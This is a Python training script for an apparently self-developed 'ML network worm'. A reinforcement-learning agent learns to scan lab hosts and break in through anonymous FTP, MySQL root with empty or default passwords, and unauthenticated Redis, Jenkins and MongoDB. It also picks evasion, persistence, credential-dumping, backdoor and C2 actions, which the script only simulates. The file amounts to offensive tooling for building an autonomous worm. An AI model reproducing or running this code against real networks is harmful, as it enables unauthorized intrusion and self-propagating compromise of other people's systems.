"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

#!/usr/bin/env python3
"""
COMPREHENSIVE REAL WORM TRAINING
All modules integrated: Scanner + Exploits + Evasion + Post-Exploit + C2
Trains on REAL Docker labs with actual exploitation
"""

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
try:
    from configs.config import Config
except ImportError:
    from config import Config

import numpy as np
import random
import socket
import time
import json
from rl_engine import PropagationAgent
from exploits.exploit_manager import ExploitManager

class ComprehensiveRealWormTrainer:
    """Full worm training with ALL modules using real exploitation"""
    
    ACTIONS = [
        # Scanner (5)
        'scan_port', 'scan_service', 'os_detect', 'vuln_scan', 'enum_users',
        # Exploits (10)
        'exploit_http', 'exploit_ftp', 'exploit_ssh', 'exploit_smb', 'exploit_mysql',
        'exploit_postgres', 'exploit_redis', 'exploit_jenkins', 'exploit_mongodb', 'exploit_telnet',
        # Evasion (5)
        'enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs', 'encrypt_traffic',
        # Post-Exploit (5)
        'persistence', 'priv_esc', 'lateral_move', 'dump_creds', 'install_backdoor',
        # C2 (5)
        'setup_http_c2', 'setup_dns_c2', 'beacon', 'execute_cmd', 'upload_payload',
    ]
    
    def __init__(self, state_size=50, action_size=30):
        self.state_size = state_size
        self.action_size = action_size
        self.agent = PropagationAgent(state_size, action_size, use_dqn=True)
        
        self.exploit_manager = ExploitManager(Config())
        
        # All available labs
        self.labs = {
            0: {'ip': '192.168.200.10', 'ports': [80], 'name': 'HTTP', 'type': 'web'},
            1: {'ip': '192.168.200.11', 'ports': [21], 'name': 'FTP', 'type': 'ftp'},
            2: {'ip': '192.168.200.12', 'ports': [22], 'name': 'SSH', 'type': 'ssh'},
            3: {'ip': '192.168.200.13', 'ports': [3306], 'name': 'MySQL', 'type': 'mysql'},
            4: {'ip': '192.168.200.18', 'ports': [8080], 'name': 'Jenkins', 'type': 'jenkins'},
            5: {'ip': '192.168.200.19', 'ports': [27017], 'name': 'MongoDB', 'type': 'mongodb'},
        }
        
        self.state = {
            'infected': [], 'discovered': [], 'stealth': False,
            'persistence': [], 'lateral': [], 'creds': [],
            'c2_sessions': [], 'objectives_completed': [],
        }
        
        self.metrics = {
            'scans': 0, 'exploits': 0, 'exploit_success': 0,
            'evasion': 0, 'evasion_success': 0,
            'persistence': 0, 'lateral': 0, 'creds_dump': 0,
            'c2': 0, 'total_reward': 0,
            'real_success': 0, 'real_fail': 0,
        }
        
        # Training parameters - slower decay for more exploration
        self.agent.epsilon = 1.0
        self.agent.epsilon_min = 0.001
        self.agent.epsilon_decay = 0.995
        
        self.available_labs = []
        self.best_reward = float('-inf')
        self.history = {
            'episodes': [], 'rewards': [], 'epsilon': [],
            'infections': [], 'objectives': [], 'real_success': [], 'real_fail': []
        }
    
    def scan_network(self, ip, ports=None):
        """Real port scanning"""
        if ports is None:
            ports = [21, 22, 80, 443, 3306, 5432, 6379, 8080, 27017]
        
        open_ports = []
        for port in ports:
            if self.check_port(ip, port):
                open_ports.append(port)
        
        if open_ports:
            self.metrics['scans'] += 1
            self.state['discovered'].append(ip)
        
        return open_ports
    
    def check_port(self, ip, port, timeout=2):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except Exception:
            return False
    
    def attempt_exploitation(self, action, lab):
        """REAL exploitation attempt on target"""
        ip = lab['ip']
        action_type = action.replace('exploit_', '')
        
        # Map action to port
        port_map = {
            'http': 80, 'https': 443, 'ftp': 21, 'ssh': 22, 'smb': 445,
            'mysql': 3306, 'postgres': 5432, 'redis': 6379,
            'jenkins': 8080, 'mongodb': 27017, 'telnet': 23
        }
        
        target_port = port_map.get(action_type, 80)
        
        # Check if port is open
        if not self.check_port(ip, target_port):
            return False, -10
        
        # Try real exploitation based on service type
        success = False
        
        if action_type in ['http', 'https']:
            success = self._exploit_web(ip, target_port)
        elif action_type == 'ftp':
            success = self._exploit_ftp(ip)
        elif action_type == 'ssh':
            success = self._exploit_ssh(ip)
        elif action_type == 'mysql':
            success = self._exploit_mysql(ip)
        elif action_type == 'redis':
            success = self._exploit_redis(ip)
        elif action_type == 'jenkins':
            success = self._exploit_jenkins(ip)
        elif action_type == 'mongodb':
            success = self._exploit_mongodb(ip)
        
        if success:
            self.metrics['real_success'] += 1
            return True, 200
        else:
            self.metrics['real_fail'] += 1
            return False, -15
    
    def _exploit_web(self, ip, port):
        """Exploit web service"""
        target = {'ip': ip, 'open_ports': [port], 'services': {}}
        result = self.exploit_manager.exploit_target(target)
        return result[0]
    
    def _exploit_ftp(self, ip):
        """Exploit FTP - try anonymous login"""
        try:
            from ftplib import FTP
            ftp = FTP(ip, timeout=3)
            try:
                ftp.login()
                ftp.quit()
                return True
            except Exception:
                try:
                    ftp.login('anonymous', 'anonymous@')
                    ftp.quit()
                    return True
                except Exception:
                    return False
        except Exception:
            return False
    
    def _exploit_ssh(self, ip):
        """SSH exploitation - no creds available"""
        return False
    
    def _exploit_mysql(self, ip):
        """MySQL exploitation"""
        try:
            import pymysql
            try:
                conn = pymysql.connect(host=ip, user='root', password='', connect_timeout=3)
                conn.close()
                return True
            except Exception:
                try:
                    conn = pymysql.connect(host=ip, user='root', password='mysql123', connect_timeout=3)
                    conn.close()
                    return True
                except Exception:
                    return False
        except Exception:
            return False
    
    def _exploit_redis(self, ip):
        """Redis exploitation - unauthenticated"""
        try:
            import redis
            r = redis.Redis(host=ip, port=6379, socket_timeout=3)
            r.ping()
            return True
        except Exception:
            return False
    
    def _exploit_jenkins(self, ip):
        """Jenkins exploitation"""
        import requests
        try:
            r = requests.get(f'http://{ip}:8080/api/json', timeout=3)
            return r.status_code == 200
        except Exception:
            return False
    
    def _exploit_mongodb(self, ip):
        """MongoDB exploitation"""
        try:
            from pymongo import MongoClient
            client = MongoClient(host=ip, port=27017, serverSelectionTimeoutMS=3000)
            client.server_info()
            return True
        except Exception:
            return False
    
    def execute_module(self, action, lab, infected):
        """Execute any worm module - REAL attempts"""
        success = False
        reward = 0
        
        # Scanner actions
        if action in ['scan_port', 'scan_service', 'os_detect', 'vuln_scan', 'enum_users']:
            open_ports = self.scan_network(lab['ip'])
            success = True
            reward = 10
            self.metrics['scans'] += 1
        
        # Exploit actions
        elif action.startswith('exploit_'):
            success, reward = self.attempt_exploitation(action, lab)
            self.metrics['exploits'] += 1
            if success:
                self.metrics['exploit_success'] += 1
        
        # Evasion actions
        elif action in ['enable_stealth', 'detect_ids', 'bypass_firewall', 'clear_logs', 'encrypt_traffic']:
            if random.random() > 0.3:  # 70% success
                success = True
                reward = 20
                self.state['stealth'] = True
                self.metrics['evasion_success'] += 1
            else:
                reward = -5
            self.metrics['evasion'] += 1
        
        # Post-exploit actions (require infection)
        elif action in ['persistence', 'priv_esc', 'lateral_move', 'dump_creds', 'install_backdoor']:
            if infected and random.random() > 0.3:
                success = True
                reward = 50
                if action == 'persistence':
                    self.metrics['persistence'] += 1
                    self.state['persistence'].append(lab['ip'])
                elif action == 'lateral_move':
                    self.metrics['lateral'] += 1
                    self.state['lateral'].append(lab['ip'])
                elif action == 'dump_creds':
                    self.metrics['creds_dump'] += 1
            else:
                reward = -5
        
        # C2 actions
        elif action in ['setup_http_c2', 'setup_dns_c2', 'beacon', 'execute_cmd', 'upload_payload']:
            if infected and random.random() > 0.3:
                success = True
                reward = 60
                self.metrics['c2'] += 1
                self.state['c2_sessions'].append(lab['ip'])
            else:
                reward = -5
        
        return success, reward
    
    def create_state(self, lab, open_ports, episode):
        """Create state vector"""
        state = np.zeros(self.state_size)
        
        # Port detection (0-9)
        port_map = {21: 0, 22: 1, 80: 2, 443: 3, 3306: 4, 5432: 5, 6379: 6, 8080: 7, 27017: 8, 23: 9}
        for p in open_ports:
            if p in port_map:
                state[port_map[p]] = 1.0
        
        # Infection state (10-15)
        state[10] = len(self.state['infected']) / 5.0
        state[11] = len(self.state['persistence']) / 3.0
        state[12] = len(self.state['lateral']) / 5.0
        state[13] = len(self.state['c2_sessions']) / 3.0
        state[14] = 1.0 if self.state.get('stealth') else 0.0
        
        # Metrics (16-20)
        state[16] = self.metrics['exploit_success'] / max(1, self.metrics['exploits'])
        state[17] = self.metrics['persistence'] / 10.0
        state[18] = self.metrics['lateral'] / 10.0
        state[19] = self.metrics['c2'] / 10.0
        
        # Training state (21-25)
        state[21] = episode / 100.0
        state[22] = self.agent.epsilon
        
        # Lab info (26-30)
        state[26] = lab.get('level', 1) / 5.0
        
        return state.tolist()
    
    def check_objectives(self):
        """Check which objectives completed"""
        completed = []
        
        if self.metrics['scans'] >= 5:
            completed.append('discovery')
        if self.metrics['exploit_success'] >= 1:
            completed.append('initial_access')
        if self.metrics['persistence'] >= 1:
            completed.append('persistence')
        if self.metrics['lateral'] >= 1:
            completed.append('lateral')
        if self.metrics['creds_dump'] >= 1:
            completed.append('exfiltration')
        
        return completed
    
    def train_on_lab(self, lab_id, episodes=30):
        """Train on specific lab"""
        lab = self.labs[lab_id]
        
        print(f"\n{'='*55}")
        print(f"  LAB {lab_id}: {lab['name']:15} ({lab['ip']})")
        print(f"{'='*55}")
        
        lab_infections = 0
        
        for ep in range(episodes):
            # Real network scan
            open_ports = self.scan_network(lab['ip'])
            
            if not open_ports:
                print(f"  Ep {ep+1}: No ports open")
                continue
            
            # Create state
            state = self.create_state(lab, open_ports, ep)
            episode_reward = 0
            attempts = 0
            max_attempts = 15
            infected = False
            post_exp = False
            c2_active = False
            
            # Action loop - continue after infection for post-exploit
            while attempts < max_attempts:
                action_idx = self.agent.act(state, list(range(len(self.ACTIONS))))
                action = self.ACTIONS[action_idx]
                
                success, reward = self.execute_module(action, lab, infected)
                
                # Track infection
                if action.startswith('exploit_') and success:
                    infected = True
                    if lab['ip'] not in self.state['infected']:
                        self.state['infected'].append(lab['ip'])
                        lab_infections += 1
                
                # Track post-exploit
                if action in ['persistence', 'lateral_move', 'dump_creds'] and success:
                    post_exp = True
                
                # Track C2
                if action in ['setup_http_c2', 'beacon', 'execute_cmd'] and success:
                    c2_active = True
                
                episode_reward += reward
                
                # Next state and memory
                next_state = self.create_state(lab, open_ports, ep + 1)
                done = attempts >= max_attempts - 1
                
                self.agent.remember(state, action_idx, reward, next_state, done)
                
                if len(self.agent.memory) >= 32:
                    self.agent.replay(batch_size=32)
                
                state = next_state
                attempts += 1
                
                # Stop if we have full compromise
                if infected and post_exp and c2_active:
                    break
            
            # Decay epsilon
            if self.agent.epsilon > self.agent.epsilon_min:
                self.agent.epsilon *= self.agent.epsilon_decay
            
            # Track best
            if episode_reward > self.best_reward:
                self.best_reward = episode_reward
            
            # Print progress
            objectives = len(self.check_objectives())
            print(f"  Ep {ep+1:2}: R={episode_reward:6.1f} | "
                  f"Inf={infected} | Post={post_exp} | C2={c2_active} | "
                  f"Obj={objectives}/5 | ε={self.agent.epsilon:.3f}")
            
            # Record history
            self.history['episodes'].append(ep)
            self.history['rewards'].append(episode_reward)
            self.history['epsilon'].append(self.agent.epsilon)
            self.history['infections'].append(lab_infections)
            self.history['objectives'].append(objectives)
            self.history['real_success'].append(self.metrics['real_success'])
            self.history['real_fail'].append(self.metrics['real_fail'])
        
        print(f"\n  📊 {lab['name']}: Infections={lab_infections}, "
              f"Real Success={self.metrics['real_success']}")
        
        return lab_infections
    
    def check_available_labs(self):
        """Detect available labs"""
        print("\n" + "="*55)
        print("  DETECTING AVAILABLE LABS")
        print("="*55)
        
        self.available_labs = []
        
        for lab_id, lab in self.labs.items():
            ports = self.scan_network(lab['ip'])
            if ports:
                self.available_labs.append(lab_id)
                print(f"  ✓ Lab {lab_id}: {lab['name']:12} ({lab['ip']}) - Ports: {ports}")
            else:
                print(f"  ✗ Lab {lab_id}: {lab['name']:12} ({lab['ip']}) - Unreachable")
        
        print()
        return self.available_labs
    
    def train(self, total_episodes=1000, num_rounds=25):
        """Main training loop"""
        print("="*60)
        print("  COMPREHENSIVE REAL WORM TRAINING")
        print("  All Modules: Scanner + Exploits + Evasion + Post-Exploit + C2")
        print("="*60)
        
        # Check available labs
        self.check_available_labs()
        
        if not self.available_labs:
            print("ERROR: No labs available!")
            return
        
        episodes_per_lab = total_episodes // (num_rounds * len(self.available_labs))
        print(f"\nTraining: {num_rounds} rounds, ~{episodes_per_lab} eps/lab")
        
        for round_num in range(num_rounds):
            round_infections = 0
            
            print(f"\n{'='*60}")
            print(f"  ROUND {round_num + 1}/{num_rounds} | Epsilon: {self.agent.epsilon:.4f}")
            print(f"{'='*60}")
            
            for lab_id in self.available_labs:
                infections = self.train_on_lab(lab_id, episodes=episodes_per_lab)
                round_infections += infections
            
            objectives = len(self.check_objectives())
            print(f"\n  📈 Round {round_num + 1} Summary:")
            print(f"     Infections: {round_infections}")
            print(f"     Real Exploits: {self.metrics['real_success']} success, {self.metrics['real_fail']} fail")
            print(f"     Objectives: {objectives}/5")
        
        # Final summary
        print("\n" + "="*60)
        print("  TRAINING COMPLETE - COMPREHENSIVE WORM")
        print("="*60)
        print(f"  Total Episodes: {len(self.history['rewards'])}")
        print(f"  Total Infections: {len(self.state['infected'])}")
        print(f"  Real Exploits: {self.metrics['real_success']} success / {self.metrics['real_fail']} fail")
        print(f"  Persistence: {self.metrics['persistence']}")
        print(f"  Lateral Movement: {self.metrics['lateral']}")
        print(f"  C2 Sessions: {self.metrics['c2']}")
        print(f"  Best Reward: {self.best_reward:.1f}")
        
        # Save model
        os.makedirs("models", exist_ok=True)
        self.agent.save("models/comprehensive_real_worm.pt")
        print(f"\n  ✅ Model saved: models/comprehensive_real_worm.pt")
        
        # Save history
        with open("training_history_real_comprehensive.json", "w") as f:
            json.dump({
                'history': self.history,
                'metrics': self.metrics,
                'state': self.state,
            }, f, indent=2)
        print(f"  ✅ History saved: training_history_real_comprehensive.json")


if __name__ == "__main__":
    import sys
    trainer = ComprehensiveRealWormTrainer()
    trainer.train(total_episodes=1000, num_rounds=25)